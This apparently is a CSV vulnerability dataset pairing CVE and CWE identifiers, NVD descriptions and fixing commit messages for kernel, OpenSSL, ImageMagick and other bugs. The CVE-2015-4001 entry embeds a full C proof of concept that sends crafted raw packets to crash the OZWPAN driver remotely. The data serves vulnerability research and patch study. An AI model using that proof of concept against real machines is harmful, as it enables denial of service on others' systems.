CVE-2017-15116,CWE-476,2017-11-30,The rngapi_reset function in crypto/rng.c in the Linux kernel before 4.2 allows attackers to cause a denial of service (NULL pointer dereference).,"Now that all rng implementations have switched over to the new interface, we can remove the old low-level interface.  Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
CVE-2016-6136,CWE-362,2016-08-06,"Race condition in the audit_log_single_execve_arg function in kernel/auditsc.c in the Linux kernel through 4.7 allows local users to bypass intended character-set restrictions or disrupt system-call auditing by changing a certain string, aka a ""double fetch"" vulnerability.","There is a double fetch problem in audit_log_single_execve_arg() where we first check the execve(2) argumnets for any ""bad"" characters which would require hex encoding and then re-fetch the arguments for logging in the audit record[1].  Of course this leaves a window of opportunity for an unsavory application to munge with the data.  This patch reworks things by only fetching the argument data once[2] into a buffer where it is scanned and logged into the audit records(s).  In addition to fixing the double fetch, this patch improves on the original code in a few other ways: better handling of large arguments which require encoding, stricter record length checking, and some performance improvements (completely unverified, but we got rid of some strlen() calls, that's got to be a good thing).  As part of the development of this patch, I've also created a basic regression test for the audit-testsuite, the test can be tracked on GitHub at the following link:   * linux-audit/audit-testsuite#25  [1] If you pay careful attention, there is actually a triple fetch problem due to a strnlen_user() call at the top of the function.  [2] This is a tiny white lie, we do make a call to strnlen_user() prior to fetching the argument data.  I don't like it, but due to the way the audit record is structured we really have no choice unless we copy the entire argument at once (which would require a rather wasteful allocation).  The good news is that with this patch the kernel no longer relies on this strnlen_user() value for anything beyond recording it in the log, we also update it with a trustworthy value whenever possible.  Reported-by: Pengfei Wang <wpengfeinudt@gmail.com> Cc: <stable@vger.kernel.org> Signed-off-by: Paul Moore <paul@paul-moore.com>"
CVE-2014-3568,CWE-310,2014-10-19,"OpenSSL before 0.9.8zc, 1.0.0 before 1.0.0o, and 1.0.1 before 1.0.1j does not properly enforce the no-ssl3 build option, which allows remote attackers to bypass intended access restrictions via an SSL 3.0 handshake, related to s23_clnt.c and s23_srvr.c.",
CVE-2016-8650,CWE-20,2016-11-28,"The mpi_powm function in lib/mpi/mpi-pow.c in the Linux kernel through 4.8.11 does not ensure that memory is allocated for limb data, which allows local users to cause a denial of service (stack memory corruption and panic) via an add_key system call for an RSA key with a zero exponent.","This fixes CVE-2016-8650.  If mpi_powm() is given a zero exponent, it wants to immediately return either 1 or 0, depending on the modulus.  However, if the result was initalised with zero limb space, no limbs space is allocated and a NULL-pointer exception ensues.  Fix this by allocating a minimal amount of limb space for the result when the 0-exponent case when the result is 1 and not touching the limb space when the result is 0.  This affects the use of RSA keys and X.509 certificates that carry them.  BUG: unable to handle kernel NULL pointer dereference at           (null) IP: [<ffffffff8138ce5d>] mpi_powm+0x32/0x7e6 PGD 0 Oops: 0002 [#1] SMP Modules linked in: CPU: 3 PID: 3014 Comm: keyctl Not tainted 4.9.0-rc6-fscache+ #278 Hardware name: ASUS All Series/H97-PLUS, BIOS 2306 10/09/2014 task: ffff8804011944c0 task.stack: ffff880401294000 RIP: 0010:[<ffffffff8138ce5d>]  [<ffffffff8138ce5d>] mpi_powm+0x32/0x7e6 RSP: 0018:ffff880401297ad8  EFLAGS: 00010212 RAX: 0000000000000000 RBX: ffff88040868bec0 RCX: ffff88040868bba0 RDX: ffff88040868b260 RSI: ffff88040868bec0 RDI: ffff88040868bee0 RBP: ffff880401297ba8 R08: 0000000000000000 R09: 0000000000000000 R10: 0000000000000047 R11: ffffffff8183b210 R12: 0000000000000000 R13: ffff8804087c7600 R14: 000000000000001f R15: ffff880401297c50 FS:  00007f7a7918c700(0000) GS:ffff88041fb80000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 0000000000000000 CR3: 0000000401250000 CR4: 00000000001406e0 Stack:  ffff88040868bec0 0000000000000020 ffff880401297b00 ffffffff81376cd4  0000000000000100 ffff880401297b10 ffffffff81376d12 ffff880401297b30  ffffffff81376f37 0000000000000100 0000000000000000 ffff880401297ba8 Call Trace:  [<ffffffff81376cd4>] ? __sg_page_iter_next+0x43/0x66  [<ffffffff81376d12>] ? sg_miter_get_next_page+0x1b/0x5d  [<ffffffff81376f37>] ? sg_miter_next+0x17/0xbd  [<ffffffff8138ba3a>] ? mpi_read_raw_from_sgl+0xf2/0x146  [<ffffffff8132a95c>] rsa_verify+0x9d/0xee  [<ffffffff8132acca>] ? pkcs1pad_sg_set_buf+0x2e/0xbb  [<ffffffff8132af40>] pkcs1pad_verify+0xc0/0xe1  [<ffffffff8133cb5e>] public_key_verify_signature+0x1b0/0x228  [<ffffffff8133d974>] x509_check_for_self_signed+0xa1/0xc4  [<ffffffff8133cdde>] x509_cert_parse+0x167/0x1a1  [<ffffffff8133d609>] x509_key_preparse+0x21/0x1a1  [<ffffffff8133c3d7>] asymmetric_key_preparse+0x34/0x61  [<ffffffff812fc9f3>] key_create_or_update+0x145/0x399  [<ffffffff812fe227>] SyS_add_key+0x154/0x19e  [<ffffffff81001c2b>] do_syscall_64+0x80/0x191  [<ffffffff816825e4>] entry_SYSCALL64_slow_path+0x25/0x25 Code: 56 41 55 41 54 53 48 81 ec a8 00 00 00 44 8b 71 04 8b 42 04 4c 8b 67 18 45 85 f6 89 45 80 0f 84 b4 06 00 00 85 c0 75 2f 41 ff ce <49> c7 04 24 01 00 00 00 b0 01 75 0b 48 8b 41 18 48 83 38 01 0f RIP  [<ffffffff8138ce5d>] mpi_powm+0x32/0x7e6  RSP <ffff880401297ad8> CR2: 0000000000000000 ---[ end trace d82015255d4a5d8d ]---  Basically, this is a backport of a libgcrypt patch:  	http://git.gnupg.org/cgi-bin/gitweb.cgi?p=libgcrypt.git;a=patch;h=6e1adb05d290aeeb1c230c763970695f4a538526  Fixes: cdec9cb (""crypto: GnuPG based MPI lib - source files (part 1)"") Signed-off-by: Andrey Ryabinin <aryabinin@virtuozzo.com> Signed-off-by: David Howells <dhowells@redhat.com> cc: Dmitry Kasatkin <dmitry.kasatkin@gmail.com> cc: linux-ima-devel@lists.sourceforge.net cc: stable@vger.kernel.org Signed-off-by: James Morris <james.l.morris@oracle.com>"
CVE-2016-2108,CWE-119,2016-05-05,"The ASN.1 implementation in OpenSSL before 1.0.1o and 1.0.2 before 1.0.2c allows remote attackers to execute arbitrary code or cause a denial of service (buffer underflow and memory corruption) via an ANY field in crafted serialized data, aka the ""negative zero"" issue.",
CVE-2019-14459,CWE-190,2019-07-31,nfdump 1.6.17 and earlier is affected by an integer overflow in the function Process_ipfix_template_withdraw in ipfix.c that can be abused in order to crash the process remotely (denial of service).,
CVE-2017-12667,CWE-772,2017-08-07,ImageMagick 7.0.6-1 has a memory leak vulnerability in ReadMATImage in coders\mat.c.,
CVE-2014-0131,CWE-416,2014-03-24,Use-after-free vulnerability in the skb_segment function in net/core/skbuff.c in the Linux kernel through 3.13.6 allows attackers to obtain sensitive information from kernel memory by leveraging the absence of a certain orphaning operation.,"skb_segment copies frags around, so we need to copy them carefully to avoid accessing user memory after reporting completion to userspace through a callback.  skb_segment doesn't normally happen on datapath: TSO needs to be disabled - so disabling zero copy in this case does not look like a big deal.  Signed-off-by: Michael S. Tsirkin <mst@redhat.com> Acked-by: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-5551,,2017-02-06,"The simple_set_acl function in fs/posix_acl.c in the Linux kernel before 4.9.6 preserves the setgid bit during a setxattr call involving a tmpfs filesystem, which allows local users to gain group privileges by leveraging the existence of a setgid program with restrictions on execute permissions.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-7097.","This change was missed the tmpfs modification in In CVE-2016-7097 commit 0739310 (""posix_acl: Clear SGID bit when setting file permissions"") It can test by xfstest generic/375, which failed to clear setgid bit in the following test case on tmpfs:    touch $testfile   chown 100:100 $testfile   chmod 2755 $testfile   _runas -u 100 -g 101 -- setfacl -m u::rwx,g::rwx,o::rwx $testfile  Signed-off-by: Gu Zheng <guzheng1@huawei.com> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2012-3375,,2012-10-03,"The epoll_ctl system call in fs/eventpoll.c in the Linux kernel before 3.2.24 does not properly handle ELOOP errors in EPOLL_CTL_ADD operations, which allows local users to cause a denial of service (file-descriptor consumption and system crash) via a crafted application that attempts to create a circular epoll dependency.  NOTE: this vulnerability exists because of an incorrect fix for CVE-2011-1083.","An epoll_ctl(,EPOLL_CTL_ADD,,) operation can return '-ELOOP' to prevent circular epoll dependencies from being created.  However, in that case we do not properly clear the 'tfile_check_list'.  Thus, add a call to clear_tfile_check_list() for the -ELOOP case.  Signed-off-by: Jason Baron <jbaron@redhat.com> Reported-by: Yurij M. Plotnikov <Yurij.Plotnikov@oktetlabs.ru> Cc: Nelson Elhage <nelhage@nelhage.com> Cc: Davide Libenzi <davidel@xmailserver.org> Tested-by: Alexandra N. Kossovsky <Alexandra.Kossovsky@oktetlabs.ru> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2016-5352,CWE-125,2016-08-07,"epan/crypt/airpdcap.c in the IEEE 802.11 dissector in Wireshark 2.x before 2.0.4 mishandles certain length values, which allows remote attackers to cause a denial of service (application crash) via a crafted packet.",Bug: 12175 Change-Id: Iaf977ba48f8668bf8095800a115ff9a3472dd893 Reviewed-on: https://code.wireshark.org/review/15326 Petri-Dish: Michael Mann <mmann78@netscape.net> Tested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org> Reviewed-by: Alexis La Goutte <alexis.lagoutte@gmail.com> Reviewed-by: Peter Wu <peter@lekensteyn.nl> Tested-by: Peter Wu <peter@lekensteyn.nl>
CVE-2013-6450,CWE-310,2014-01-01,"The DTLS retransmission implementation in OpenSSL 1.0.0 before 1.0.0l and 1.0.1 before 1.0.1f does not properly maintain data structures for digest and encryption contexts, which might allow man-in-the-middle attackers to trigger the use of a different context and cause a denial of service (application crash) by interfering with packet delivery, related to ssl/d1_both.c and ssl/t1_enc.c.",
CVE-2016-10749,CWE-125,2019-04-29,"parse_string in cJSON.c in cJSON before 2016-10-02 has a buffer over-read, as demonstrated by a string that begins with a "" character and ends with a \ character.",
CVE-2016-2384,,2016-04-27,Double free vulnerability in the snd_usbmidi_create function in sound/usb/midi.c in the Linux kernel before 4.5 allows physically proximate attackers to cause a denial of service (panic) or possibly have unspecified other impact via vectors involving an invalid USB descriptor.,The 'umidi' object will be free'd on the error path by snd_usbmidi_free() when tearing down the rawmidi interface. So we shouldn't try to free it in snd_usbmidi_create() after having registered the rawmidi interface.  Found by KASAN.  Signed-off-by: Andrey Konovalov <andreyknvl@gmail.com> Acked-by: Clemens Ladisch <clemens@ladisch.de> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>
CVE-2016-2179,CWE-399,2016-09-16,"The DTLS implementation in OpenSSL before 1.1.0 does not properly restrict the lifetime of queue entries associated with unused out-of-order messages, which allows remote attackers to cause a denial of service (memory consumption) by maintaining many crafted DTLS sessions simultaneously, related to d1_lib.c, statem_dtls.c, statem_lib.c, and statem_srvr.c.",
CVE-2018-19854,CWE-200,2018-12-04,"An issue was discovered in the Linux kernel before 4.19.3. crypto_report_one() and related functions in crypto/crypto_user.c (the crypto user configuration API) do not fully initialize structures that are copied to userspace, potentially leaking sensitive memory to user programs. NOTE: this is a CVE-2013-2547 regression but with easier exploitability because the attacker does not need a capability (however, the system must have the CONFIG_CRYPTO_USER kconfig option).","All bytes of the NETLINK_CRYPTO report structures must be initialized, since they are copied to userspace.  The change from strncpy() to strlcpy() broke this.  As a minimal fix, change it back.  Fixes: 4473710 (""crypto: user - Prepare for CRYPTO_MAX_ALG_NAME expansion"") Cc: <stable@vger.kernel.org> # v4.12+ Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
CVE-2013-3232,CWE-200,2013-04-22,"The nr_recvmsg function in net/netrom/af_netrom.c in the Linux kernel before 3.9-rc7 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","sizeof() when applied to a pointer typed expression gives the size of the pointer, not that of the pointed data. Introduced by commit 3ce5ef(netrom: fix info leak via msg_name in nr_recvmsg)  Signed-off-by: Wei Yongjun <yongjun_wei@trendmicro.com.cn> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-15652,CWE-200,2019-05-23,"Artifex Ghostscript 9.22 is affected by: Obtain Information. The impact is: obtain sensitive information. The component is: affected source code file, affected function, affected executable, affected libga (imagemagick used that). The attack vector is: Someone must open a postscript file though ghostscript. Because of imagemagick also use libga, so it was affected as well.",
CVE-2011-3602,CWE-22,2014-04-27,"Directory traversal vulnerability in device-linux.c in the router advertisement daemon (radvd) before 1.8.2 allows local users to overwrite arbitrary files, and remote attackers to overwrite certain files, via a .. (dot dot) in an interface name.  NOTE: this can be leveraged with a symlink to overwrite arbitrary files.","fopen(path ""/"" ifname, ""w"") on it.  As ""ifname"" is an untrusted input, it should be checked for "".."" and/or ""/"" in it.  Otherwise, an infected unprivileged daemon may overwrite contents of file named ""mtu"", ""hoplimit"", etc. in arbitrary location with arbitrary 32-bit value in decimal representation (""%d"").  If an attacker has a local account or may create arbitrary symlinks with these names in any location (e.g. /tmp), any file may be overwritten with a decimal value."
CVE-2017-13023,CWE-125,2017-09-14,The IPv6 mobility parser in tcpdump before 4.9.2 has a buffer over-read in print-mobility.c:mobility_opt_print().,"This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't cause 'tcpdump: pcap_loop: truncated dump file'"
CVE-2019-11072,CWE-190,2019-04-10,"lighttpd before 1.4.54 has a signed integer overflow, which might allow remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a malicious HTTP GET request, as demonstrated by mishandling of /%2F? in burl_normalize_2F_to_slash_fix in burl.c. NOTE: The developer states ""The feature which can be abused to cause the crash is a new feature in lighttpd 1.4.50, and is not enabled by default. It must be explicitly configured in the config file (e.g. lighttpd.conf). Certain input will trigger an abort() in lighttpd when that feature is enabled. lighttpd detects the underflow or realloc() will fail (in both 32-bit and 64-bit executables), also detected in lighttpd. Either triggers an explicit abort() by lighttpd. This is not exploitable beyond triggering the explicit abort() with subsequent application exit.","fix abort in server.http-parseopts with url-path-2f-decode enabled  (thx stze)  x-ref:   ""Security - SIGABRT during GET request handling with url-path-2f-decode enabled""   https://redmine.lighttpd.net/issues/2945"
CVE-2014-4344,CWE-476,2014-08-14,The acc_ctx_cont function in the SPNEGO acceptor in lib/gssapi/spnego/spnego_mech.c in MIT Kerberos 5 (aka krb5) 1.5.x through 1.12.x before 1.12.2 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via an empty continuation token at a certain point during a SPNEGO negotiation.,"When processing a continuation token, acc_ctx_cont was dereferencing the initial byte of the token without checking the length.  This could result in a null dereference.  CVE-2014-4344:  In MIT krb5 1.5 and newer, an unauthenticated or partially authenticated remote attacker can cause a NULL dereference and application crash during a SPNEGO negotiation by sending an empty token as the second or later context token from initiator to acceptor. The attacker must provide at least one valid context token in the security context negotiation before sending the empty token.  This can be done by an unauthenticated attacker by forcing SPNEGO to renegotiate the underlying mechanism, or by using IAKERB to wrap an unauthenticated AS-REQ as the first token.      CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:POC/RL:OF/RC:C  [kaduk@mit.edu: CVE summary, CVSSv2 vector]  ticket: 7970 (new) subject: NULL dereference in SPNEGO acceptor for continuation tokens [CVE-2014-4344] target_version: 1.12.2 tags: pullup"
CVE-2018-5332,CWE-787,2018-01-11,"In the Linux kernel through 3.2, the rds_message_alloc_sgs() function does not validate a value that is used during DMA page allocation, leading to a heap-based out-of-bounds write (related to the rds_rdma_extra_size function in net/rds/rdma.c).","When args->nr_local is 0, nr_pages gets also 0 due some size calculation via rds_rm_size(), which is later used to allocate pages for DMA, this bug produces a heap Out-Of-Bound write access to a specific memory region.  Signed-off-by: Mohamed Ghannam <simo.ghannam@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2011-1479,CWE-399,2012-06-21,Double free vulnerability in the inotify subsystem in the Linux kernel before 2.6.39 allows local users to cause a denial of service (system crash) via vectors involving failed attempts to create files.  NOTE: this vulnerability exists because of an incorrect fix for CVE-2010-4250.,"On an error path in inotify_init1 a normal user can trigger a double free of struct user.  This is a regression introduced by a2ae4cc (""inotify: stop kernel memory leak on file creation failure"").  We fix this by making sure that if a group exists the user reference is dropped when the group is cleaned up.  We should not explictly drop the reference on error and also drop the reference when the group is cleaned up.  The new lifetime rules are that an inotify group lives from inotify_new_group to the last fsnotify_put_group.  Since the struct user and inotify_devs are directly tied to this lifetime they are only changed/updated in those two locations.  We get rid of all special casing of struct user or user->inotify_devs.  Signed-off-by: Eric Paris <eparis@redhat.com> Cc: stable@kernel.org (2.6.37 and up) Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2015-4001,CWE-189,2015-06-07,Integer signedness error in the oz_hcd_get_desc_cnf function in drivers/staging/ozwpan/ozhcd.c in the OZWPAN driver in the Linux kernel through 4.0.5 allows remote attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted packet.,"Using signed integers, the subtraction between required_size and offset could wind up being negative, resulting in a memcpy into a heap buffer with a negative length, resulting in huge amounts of network-supplied data being copied into the heap, which could potentially lead to remote code execution.. This is remotely triggerable with a magic packet. A PoC which obtains DoS follows below. It requires the ozprotocol.h file from this module.  =-=-=-=-=-=   #include <arpa/inet.h>  #include <linux/if_packet.h>  #include <net/if.h>  #include <netinet/ether.h>  #include <stdio.h>  #include <string.h>  #include <stdlib.h>  #include <endian.h>  #include <sys/ioctl.h>  #include <sys/socket.h>   #define u8 uint8_t  #define u16 uint16_t  #define u32 uint32_t  #define __packed __attribute__((__packed__))  #include ""ozprotocol.h""  static int hex2num(char c) { 	if (c >= '0' && c <= '9') 		return c - '0'; 	if (c >= 'a' && c <= 'f') 		return c - 'a' + 10; 	if (c >= 'A' && c <= 'F') 		return c - 'A' + 10; 	return -1; } static int hwaddr_aton(const char *txt, uint8_t *addr) { 	int i; 	for (i = 0; i < 6; i++) { 		int a, b; 		a = hex2num(*txt++); 		if (a < 0) 			return -1; 		b = hex2num(*txt++); 		if (b < 0) 			return -1; 		*addr++ = (a << 4) | b; 		if (i < 5 && *txt++ != ':') 			return -1; 	} 	return 0; }  int main(int argc, char *argv[]) { 	if (argc < 3) { 		fprintf(stderr, ""Usage: %s interface destination_mac\n"", argv[0]); 		return 1; 	}  	uint8_t dest_mac[6]; 	if (hwaddr_aton(argv[2], dest_mac)) { 		fprintf(stderr, ""Invalid mac address.\n""); 		return 1; 	}  	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW); 	if (sockfd < 0) { 		perror(""socket""); 		return 1; 	}  	struct ifreq if_idx; 	int interface_index; 	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1); 	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) { 		perror(""SIOCGIFINDEX""); 		return 1; 	} 	interface_index = if_idx.ifr_ifindex; 	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) { 		perror(""SIOCGIFHWADDR""); 		return 1; 	} 	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;  	struct { 		struct ether_header ether_header; 		struct oz_hdr oz_hdr; 		struct oz_elt oz_elt; 		struct oz_elt_connect_req oz_elt_connect_req; 	} __packed connect_packet = { 		.ether_header = { 			.ether_type = htons(OZ_ETHERTYPE), 			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, 			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } 		}, 		.oz_hdr = { 			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), 			.last_pkt_num = 0, 			.pkt_num = htole32(0) 		}, 		.oz_elt = { 			.type = OZ_ELT_CONNECT_REQ, 			.length = sizeof(struct oz_elt_connect_req) 		}, 		.oz_elt_connect_req = { 			.mode = 0, 			.resv1 = {0}, 			.pd_info = 0, 			.session_id = 0, 			.presleep = 35, 			.ms_isoc_latency = 0, 			.host_vendor = 0, 			.keep_alive = 0, 			.apps = htole16((1 << OZ_APPID_USB) | 0x1), 			.max_len_div16 = 0, 			.ms_per_isoc = 0, 			.up_audio_buf = 0, 			.ms_per_elt = 0 		} 	};  	struct { 		struct ether_header ether_header; 		struct oz_hdr oz_hdr; 		struct oz_elt oz_elt; 		struct oz_get_desc_rsp oz_get_desc_rsp; 	} __packed pwn_packet = { 		.ether_header = { 			.ether_type = htons(OZ_ETHERTYPE), 			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, 			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } 		}, 		.oz_hdr = { 			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), 			.last_pkt_num = 0, 			.pkt_num = htole32(1) 		}, 		.oz_elt = { 			.type = OZ_ELT_APP_DATA, 			.length = sizeof(struct oz_get_desc_rsp) 		}, 		.oz_get_desc_rsp = { 			.app_id = OZ_APPID_USB, 			.elt_seq_num = 0, 			.type = OZ_GET_DESC_RSP, 			.req_id = 0, 			.offset = htole16(2), 			.total_size = htole16(1), 			.rcode = 0, 			.data = {0} 		} 	};  	struct sockaddr_ll socket_address = { 		.sll_ifindex = interface_index, 		.sll_halen = ETH_ALEN, 		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } 	};  	if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { 		perror(""sendto""); 		return 1; 	} 	usleep(300000); 	if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) { 		perror(""sendto""); 		return 1; 	} 	return 0; }  Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com> Acked-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2013-4516,CWE-200,2013-11-12,"The mp_get_count function in drivers/staging/sb105x/sb_pci_mp.c in the Linux kernel before 3.12 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel stack memory via a TIOCGICOUNT ioctl call.",The icount.reserved[] array isn't initialized so it leaks stack information to userspace.  Reported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2017-15033,CWE-772,2017-10-05,ImageMagick version 7.0.7-2 contains a memory leak in ReadYUVImage in coders/yuv.c.,
CVE-2013-1956,CWE-264,2013-04-24,"The create_user_ns function in kernel/user_namespace.c in the Linux kernel before 3.8.6 does not check whether a chroot directory exists that differs from the namespace root directory, which allows local users to bypass intended filesystem restrictions via a crafted clone system call.","Guarantee that the policy of which files may be access that is established by setting the root directory will not be violated by user namespaces by verifying that the root directory points to the root of the mount namespace at the time of user namespace creation.  Changing the root is a privileged operation, and as a matter of policy it serves to limit unprivileged processes to files below the current root directory.  For reasons of simplicity and comprehensibility the privilege to change the root directory is gated solely on the CAP_SYS_CHROOT capability in the user namespace.  Therefore when creating a user namespace we must ensure that the policy of which files may be access can not be violated by changing the root directory.  Anyone who runs a processes in a chroot and would like to use user namespace can setup the same view of filesystems with a mount namespace instead.  With this result that this is not a practical limitation for using user namespaces.  Cc: stable@vger.kernel.org Acked-by: Serge Hallyn <serge.hallyn@canonical.com> Reported-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com>"
CVE-2018-18397,CWE-863,2018-12-12,"The userfaultfd implementation in the Linux kernel before 4.19.7 mishandles access control for certain UFFDIO_ ioctl calls, as demonstrated by allowing local users to write data into holes in a tmpfs file (if the user has read-only access to that file, and that file contains holes), related to fs/userfaultfd.c and mm/userfaultfd.c.","After the VMA to register the uffd onto is found, check that it has VM_MAYWRITE set before allowing registration.  This way we inherit all common code checks before allowing to fill file holes in shmem and hugetlbfs with UFFDIO_COPY.  The userfaultfd memory model is not applicable for readonly files unless it's a MAP_PRIVATE.  Link: http://lkml.kernel.org/r/20181126173452.26955-4-aarcange@redhat.com Fixes: ff62a34 (""hugetlb: implement memfd sealing"") Signed-off-by: Andrea Arcangeli <aarcange@redhat.com> Reviewed-by: Mike Rapoport <rppt@linux.ibm.com> Reviewed-by: Hugh Dickins <hughd@google.com> Reported-by: Jann Horn <jannh@google.com> Fixes: 4c27fe4 (""userfaultfd: shmem: add shmem_mcopy_atomic_pte for userfaultfd support"") Cc: <stable@vger.kernel.org> Cc: ""Dr. David Alan Gilbert"" <dgilbert@redhat.com> Cc: Mike Kravetz <mike.kravetz@oracle.com> Cc: Peter Xu <peterx@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2019-14323,CWE-193,2019-07-28,"SSDP Responder 1.x through 1.5 mishandles incoming network messages, leading to a stack-based buffer overflow by 1 byte. This results in a crash of the server, but only when strict stack checking is enabled. This is caused by an off-by-one error in ssdp_recv in ssdpd.c.",Signed-off-by: Joachim Nilsson <troglobit@gmail.com>
CVE-2016-7533,CWE-125,2017-04-19,The ReadWPGImage function in coders/wpg.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted WPG file.,
CVE-2014-7826,CWE-476,2014-11-10,"kernel/trace/trace_syscalls.c in the Linux kernel through 3.17.2 does not properly handle private syscall numbers during use of the ftrace subsystem, which allows local users to gain privileges or cause a denial of service (invalid pointer dereference) via a crafted application.","ARM has some private syscalls (for example, set_tls(2)) which lie outside the range of NR_syscalls.  If any of these are called while syscall tracing is being performed, out-of-bounds array access will occur in the ftrace and perf sys_{enter,exit} handlers.   # trace-cmd record -e raw_syscalls:* true && trace-cmd report  ...  true-653   [000]   384.675777: sys_enter:            NR 192 (0, 1000, 3, 4000022, ffffffff, 0)  true-653   [000]   384.675812: sys_exit:             NR 192 = 1995915264  true-653   [000]   384.675971: sys_enter:            NR 983045 (76f74480, 76f74000, 76f74b28, 76f74480, 76f76f74, 1)  true-653   [000]   384.675988: sys_exit:             NR 983045 = 0  ...   # trace-cmd record -e syscalls:* true  [   17.289329] Unable to handle kernel paging request at virtual address aaaaaace  [   17.289590] pgd = 9e71c000  [   17.289696] [aaaaaace] *pgd=00000000  [   17.289985] Internal error: Oops: 5 [#1] PREEMPT SMP ARM  [   17.290169] Modules linked in:  [   17.290391] CPU: 0 PID: 704 Comm: true Not tainted 3.18.0-rc2+ #21  [   17.290585] task: 9f4dab00 ti: 9e710000 task.ti: 9e710000  [   17.290747] PC is at ftrace_syscall_enter+0x48/0x1f8  [   17.290866] LR is at syscall_trace_enter+0x124/0x184  Fix this by ignoring out-of-NR_syscalls-bounds syscall numbers.  Commit cd0980f ""tracing: Check invalid syscall nr while tracing syscalls"" added the check for less than zero, but it should have also checked for greater than NR_syscalls.  Link: http://lkml.kernel.org/p/1414620418-29472-1-git-send-email-rabin@rab.in  Fixes: cd0980f ""tracing: Check invalid syscall nr while tracing syscalls"" Cc: stable@vger.kernel.org # 2.6.33+ Signed-off-by: Rabin Vincent <rabin@rab.in> Signed-off-by: Steven Rostedt <rostedt@goodmis.org>"
CVE-2018-14359,CWE-120,2018-07-17,An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. They have a buffer overflow via base64 data.,"The obuf can be overflowed in auth_cram.c, and possibly auth_gss.c.  Thanks to Jeriko One for the bug report."
CVE-2013-7015,CWE-20,2013-12-09,"The flashsv_decode_frame function in libavcodec/flashsv.c in FFmpeg before 2.1 does not properly validate a certain height value, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Flash Screen Video data.",Fixes out of array accesses Fixes Ticket2844  Found-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2017-18174,CWE-415,2018-02-11,"In the Linux kernel before 4.7, the amd_gpio_remove function in drivers/pinctrl/pinctrl-amd.c calls the pinctrl_unregister function, leading to a double free.","It's not necessary to unregister pin controller device registered with devm_pinctrl_register() and using pinctrl_unregister() leads to a double free.  Fixes: 3bfd443 (""pinctrl: amd: Add support for additional GPIO"") Signed-off-by: Wei Yongjun <weiyongjun1@huawei.com> Signed-off-by: Linus Walleij <linus.walleij@linaro.org>"
CVE-2017-6903,,2017-03-14,"In ioquake3 before 2017-03-14, the auto-downloading feature has insufficient content restrictions. This also affects Quake III Arena, OpenArena, OpenJK, iortcw, and other id Tech 3 (aka Quake 3 engine) forks. A malicious auto-downloaded file can trigger loading of crafted auto-downloaded files as native code DLLs. A malicious auto-downloaded file can contain configuration defaults that override the user's. Executable bytecode in a malicious auto-downloaded file can set configuration variables to values that will result in unwanted native code DLLs being loaded, resulting in sandbox escape.","Don't load .pk3s as .dlls, and don't load user config files from .pk3s."
